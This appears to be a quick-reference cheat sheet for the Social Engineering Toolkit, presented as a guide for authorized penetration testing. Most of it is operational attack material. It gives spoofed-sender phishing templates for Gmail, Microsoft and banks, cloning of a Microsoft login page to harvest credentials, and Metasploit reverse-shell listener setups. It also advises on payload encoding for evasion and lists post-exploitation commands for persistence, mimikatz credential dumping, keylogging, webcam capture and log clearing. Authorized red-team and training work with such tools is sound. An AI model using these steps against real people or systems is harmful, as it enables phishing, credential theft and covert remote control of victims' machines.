# Social Engineering Toolkit (SET) - Quick Reference Guide

## ⚠️ LEGAL WARNING
**ALL commands below require written authorization. Unauthorized use is ILLEGAL.**

## Basic SET Commands (CLI)

### Launch SET
```bash
# Interactive mode
sudo setoolkit

# Update SET
cd /usr/share/set
git pull
```

### Common Attack Vectors

#### 1. Spear-Phishing
```
1) Social-Engineering Attacks
1) Spear-Phishing Attack Vectors
1) Perform a Mass Email Attack
```

#### 2. Website Cloning
```
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner
```

#### 3. Infectious Media
```
1) Social-Engineering Attacks
3) Create a Payload and Listener
```

#### 4. USB/HID Attack
```
1) Social-Engineering Attacks
5) Mass Mailer Attack
```

## Attack Configuration Templates

### Gmail Phishing
```
Target: victim@company.com
From: security@accounts-google.com
Subject: Security Alert - Unusual Activity
Template: Google security notification
```

### Office 365 Phishing
```
Target: user@company.com
From: admin@microsoft.com
Subject: Account Verification Required
Template: Microsoft account security
```

### Banking Phishing
```
Target: customer@email.com
From: security@bankname.com
Subject: Urgent: Verify Your Transaction
Template: Bank security alert
```

## Payload Types

### Windows Payloads
```
Meterpreter Reverse TCP    - Full backdoor
Shell Reverse TCP          - Simple shell
VNC Reverse TCP           - Remote desktop
PowerShell                - PowerShell payload
```

### Linux Payloads
```
Shell Reverse TCP         - Simple shell
Meterpreter Reverse TCP  - Full backdoor
```

### Android Payloads
```
Meterpreter Reverse TCP  - Full backdoor APK
Shell Reverse TCP        - Simple shell APK
```

### macOS Payloads
```
Meterpreter Reverse TCP  - Full backdoor
Shell Reverse TCP        - Simple shell
```

## Common SMTP Servers

### Gmail
```
Server: smtp.gmail.com
TLS Port: 587
SSL Port: 465
Auth: Required (App Password)
```

### Outlook/Office 365
```
Server: smtp.office365.com
Port: 587
Auth: Required
TLS: Required
```

### Yahoo
```
Server: smtp.mail.yahoo.com
Port: 587 or 465
Auth: Required
```

### Custom/Local
```
Server: localhost or IP
Port: 25 (default)
Auth: Optional
```

## Metasploit Integration

### Setup Listener for Payload

#### Meterpreter Reverse TCP
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 443
exploit -j
```

#### Shell Reverse TCP
```bash
msfconsole
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

#### Android Meterpreter
```bash
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j
```

### Multi-Handler with Multiple Payloads
```bash
msfconsole
use exploit/multi/handler
set ExitOnSession false
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 443
exploit -j -z
```

## Email Template Variables

### Available Variables
```
%FIRSTNAME%    - Target's first name
%LASTNAME%     - Target's last name
%EMAIL%        - Target's email
%COMPANY%      - Company name
%DATE%         - Current date
%TIME%         - Current time
```

### Template Example
```html
Dear %FIRSTNAME%,

Your %COMPANY% account requires immediate attention.

Click here to verify: [MALICIOUS LINK]

Best regards,
IT Security Team
```

## Website Cloning

### Clone Website
```bash
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner

# Enter URL to clone
URL: https://login.microsoft.com

# Enter IP for POST back
IP: 192.168.1.100
```

### Captured Credentials Location
```
/var/www/html/harvester_timestamp.txt
/root/.set/reports/
```

## Payload Encoding

### Encoding Types
```
1) None                    - No encoding
2) Shikata Ga Nai         - Polymorphic XOR
3) Call/JMP XOR           - Call/JMP encoder
4) Countdown              - Countdown encoder
5) Fnstenv                - FPU encoder
6) Jmp/Call XOR           - Jmp/Call encoder
7) Alpha Mixed            - Alphanumeric mixed
8) Alpha Upper            - Alphanumeric uppercase
9) Unicode                - Unicode encoder
```

### Recommended Encoding
```
Low Detection: Shikata Ga Nai (x3 iterations)
High Evasion: Multiple encodings chained
```

## USB/HID Attack Payloads

### Teensy/Arduino Payloads
```bash
# Launch SET
sudo setoolkit

# Navigate to
1) Social-Engineering Attacks
3) Create a Payload and Listener
# Select Teensy/Arduino options
```

### Common HID Payloads
```
1) Powershell HTTP GET     - Download & execute
2) Powershell WSCRIPT      - Execute script
3) WSCRIPT HTTP            - Download via script
4) Gnome wget              - Linux download
5) Binary                  - Execute binary
```

## QR Code Attacks

### Generate Malicious QR Code
```bash
# Launch SET
sudo setoolkit

# Navigate to
1) Social-Engineering Attacks
9) QRCode Generator Attack Vector

# Enter malicious URL
URL: http://192.168.1.100/payload.apk
```

### QR Code Use Cases
```
- Phishing URLs
- Malicious download links
- Fake WiFi connection QR codes
- Malicious app installation
```

## Mass Mailer

### Email List Format
```
victim1@company.com
victim2@company.com
victim3@company.com
```

### Mass Mail Configuration
```bash
# Select Mass Mailer
5) Mass Mailer Attack

# Options
1) E-Mail Attack Single Email Address
2) E-Mail Attack Mass Mailer
# Choose 2 for mass mailer

# Provide email list file
/path/to/email_list.txt
```

## Wireless Attack

### Create Fake AP
```bash
# Launch SET
1) Social-Engineering Attacks
7) Wireless Access Point Attack Vector

# Configuration
SSID: Free_WiFi
Channel: 6
```

### Credential Harvesting
```
Capture methods:
1) Airodump-NG
2) Wifiphisher
3) Manual setup
```

## SET Configuration File

### Location
```
/etc/setoolkit/set.config
~/.set/set.config
```

### Key Settings
```ini
# Email settings
SENDMAIL=OFF
GMAIL_USERNAME=
GMAIL_PASSWORD=

# Webserver
WEBATTACK_PORT=80
APACHE_SERVER=ON

# Metasploit
METASPLOIT_PATH=/usr/share/metasploit-framework
AUTO_DETECT=ON
```

## Automation Scripts

### Automated Phishing Campaign
```bash
#!/bin/bash
# Automated SET phishing

# Configuration
LHOST="192.168.1.100"
TARGETS="targets.txt"
TEMPLATE="gmail"

# Start Metasploit listener
msfconsole -q -x "use exploit/multi/handler; \
set payload windows/meterpreter/reverse_tcp; \
set LHOST $LHOST; \
set LPORT 443; \
exploit -j"

# Launch SET (interactive required)
# Use expect or pexpect for full automation
```

### Credential Harvester Automation
```bash
#!/bin/bash
# Quick credential harvester setup

CLONE_URL="https://login.microsoft.com"
LHOST=$(hostname -I | awk '{print $1}')

echo "Setting up credential harvester..."
echo "Clone URL: $CLONE_URL"
echo "LHOST: $LHOST"

# Start Apache
sudo systemctl start apache2

# Note: Manual SET interaction required
sudo setoolkit
```

## Post-Exploitation

### Meterpreter Commands
```
# System info
sysinfo
getuid
getpid

# Escalate privileges
getsystem

# Persistence
run persistence -X -i 60 -p 443 -r 192.168.1.100

# Dump credentials
hashdump
load mimikatz
mimikatz_command -f sekurlsa::logonpasswords

# Keylogger
keyscan_start
keyscan_dump

# Screenshot
screenshot

# Webcam
webcam_snap
webcam_stream
```

### Shell Commands
```bash
# Windows
systeminfo
whoami /priv
net user
net localgroup administrators

# Linux
uname -a
id
sudo -l
cat /etc/passwd
```

## Common Ports

### Recommended Listening Ports
```
443   - HTTPS (common, less filtered)
80    - HTTP (very common)
4444  - Default Metasploit
8080  - HTTP alternative
53    - DNS (often allowed out)
```

### Firewall Rules
```bash
# Allow incoming on listener port
sudo ufw allow 443/tcp

# Or using iptables
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT
```

## Debugging

### Enable Verbose Mode
```bash
# Run SET with debug
sudo setoolkit --verbose
```

### Check Logs
```bash
# SET logs
tail -f /root/.set/set.log

# Apache logs
tail -f /var/log/apache2/access.log
tail -f /var/log/apache2/error.log

# System logs
tail -f /var/log/syslog
```

### Test SMTP
```bash
# Test SMTP connection
telnet smtp.gmail.com 587

# Test email sending
echo "Test" | mail -s "Test" target@email.com
```

## Quick Attack Checklist

### Pre-Attack
- [ ] Written authorization obtained
- [ ] Scope clearly defined
- [ ] Testing window scheduled
- [ ] Emergency contacts ready
- [ ] Backup plan prepared

### Setup
- [ ] SET installed and updated
- [ ] Network configured (LHOST, LPORT)
- [ ] Metasploit listener running
- [ ] SMTP server tested
- [ ] Firewall rules configured

### Execution
- [ ] Attack launched successfully
- [ ] Monitoring for callbacks
- [ ] Logging all activities
- [ ] Documenting findings
- [ ] Communication with client

### Post-Attack
- [ ] All backdoors removed
- [ ] Listeners shut down
- [ ] Logs collected
- [ ] Report generated
- [ ] Captured data secured/deleted

## Emergency Procedures

### Stop All Attacks
```bash
# Kill SET processes
sudo killall setoolkit

# Stop listeners
jobs -K  # in Metasploit

# Stop Apache
sudo systemctl stop apache2

# Flush iptables
sudo iptables -F
```

### Evidence Cleanup
```bash
# Remove payloads
rm -rf /var/www/html/*

# Clear logs (only if authorized)
> /var/log/apache2/access.log
> /var/log/apache2/error.log

# Clear SET data
rm -rf ~/.set/*
```

## Best Practices

### DO
✅ Get written authorization
✅ Document everything
✅ Test in isolated environment first
✅ Communicate with client
✅ Secure captured data
✅ Provide detailed reports
✅ Offer remediation advice

### DON'T
❌ Test without permission
❌ Exceed defined scope
❌ Cause unnecessary damage
❌ Share captured credentials
❌ Brag about successful attacks
❌ Use for malicious purposes
❌ Ignore laws and regulations

## Resources

### Official
- GitHub: https://github.com/trustedsec/social-engineer-toolkit
- TrustedSec: https://www.trustedsec.com

### Learning
- Social-Engineer.org: https://www.social-engineer.org
- SANS Security Awareness: https://www.sans.org/security-awareness-training/

### Legal
- CFAA: Computer Fraud and Abuse Act
- Wire Fraud Act
- State computer crime laws

---

**REMEMBER: This is a powerful tool. Use it responsibly, legally, and ethically.**
